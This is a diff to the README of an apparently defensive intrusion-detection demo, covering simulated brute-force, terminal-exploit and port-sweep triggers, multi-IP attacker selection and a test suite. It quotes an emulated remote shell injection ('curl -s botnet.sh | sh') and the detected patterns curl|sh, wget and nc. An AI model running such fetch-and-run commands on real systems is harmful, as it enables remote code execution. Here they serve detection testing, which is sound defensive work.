@@ -49,14 +49,14 @@ You can demonstrate detection and mitigation using **either** the web UI or the 
 
 #### Method A: Direct Browser 1-Click Trigger (Recommended for Presentations)
 1. On the dashboard, locate the **Adversary Intrusion Simulation (Red Team Controls)** toolbar.
+   * Each attack card features a multi-IP selector: **Auto-Rotate IP** (5-IP RFC 5737 pool), individual attacker IPs, **Swarm Mode** (attacking from all 5 IPs simultaneously), or **Custom IP** input (allowing live verification of custom external or allowlisted IPs).
 2. Click **`⚡ Trigger Brute-Force`**:
-   * Watch the **General Activity Logs** stream authentication failures in real time.
+   * Watch the **General Activity Logs** stream authentication failures in real time from the selected/rotated attacker IP.
    * Upon the 5th attempt, watch the system autonomously inject an `IPTABLES_DROP` rule and display the record in the **Autonomous Mitigation Ledger**!
 3. Click **`🔥 Trigger Terminal Exploit`**:
-   * Emulates a remote shell injection (`curl -s botnet.sh | sh`).
-   * Evaluates the command pattern and immediately fires a **`CRITICAL`** kernel drop in sub-millisecond time.
+   * Emulates a remote shell injection (`curl | sh`, `wget`, `nc`) and immediately fires a **`CRITICAL`** kernel drop in sub-millisecond time.
 4. Click **`📡 Trigger Port Sweep`**:
-   * Emulates a port reconnaissance probe, triggering a subnet sweep mitigation.
+   * Emulates a port reconnaissance probe (or multi-IP Swarm burst), triggering subnet sweep mitigation.
 
 #### Method B: Automated CLI Adversary Script
 In your terminal, execute the automated red team adversary script:
@@ -157,13 +157,13 @@ python3 tests/attacker_sim.py --all
 ---
 
 ## 4. Test Suite Execution
-To prove system reliability during evaluation, run all 38 automated tests:
+To prove system reliability during evaluation, run all 40 automated tests:
 ```bash
 python3 -m unittest discover -s tests
 ```
 * **Mitigation Driver Tests:** 11 tests (allowlists, Netfilter idempotency, Docker SDK mocking)
 * **Detection Engine Tests:** 7 tests (sliding window, brute-force threshold, SQLite audit)
-* **FastAPI Backend Tests:** 10 tests (SSE stream headers, REST API schema validation, attack simulation triggers)
+* **FastAPI Backend Tests:** 12 tests (SSE stream headers, REST API schema validation, multi-IP / swarm / custom attack simulation triggers)
 * **SOC Dashboard & UI Tests:** 4 tests (HTML template serving, XSS-safe JavaScript rendering, 6-column SIEM grid, General Activity Logs multi-stream and Clear button validation)
 * **IoT Telemetry Listener Tests:** 1 test (MQTT listener lifecycle, non-blocking asynchronous message parsing)
 * **End-to-End Benchmark:** 2 tests (closed-loop latency SLA validation < 1,000 ms)
